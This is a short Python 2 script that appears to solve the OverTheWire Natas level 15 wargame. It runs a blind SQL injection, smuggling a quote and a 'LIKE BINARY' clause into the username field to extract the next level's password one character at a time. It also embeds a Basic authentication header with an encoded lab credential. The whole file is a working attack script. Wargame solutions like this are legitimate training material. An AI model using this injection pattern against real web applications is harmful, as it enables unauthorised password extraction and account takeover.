import requests
import string
import sys

chars = list(string.lowercase + string.uppercase + string.digits)

url = "http://natas15.natas.labs.overthewire.org/index.php"
headers = {
  'authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
  'content-type': "application/x-www-form-urlencoded"
}

password = ""

while True:
  for char in chars:
    response = requests.request("POST", url, data="username=natas16\" AND password LIKE BINARY \"" + password + char + "%", headers=headers)
    if "user exists" in response.text:
      password += char
      sys.stdout.write("\rpassword: %s" % password)
      sys.stdout.flush()
      response = requests.request("POST", url, data="username=natas16\" AND password=\"" + password + "", headers=headers)
      if "user exists" in response.text:
        print "\n"
        sys.exit()
      break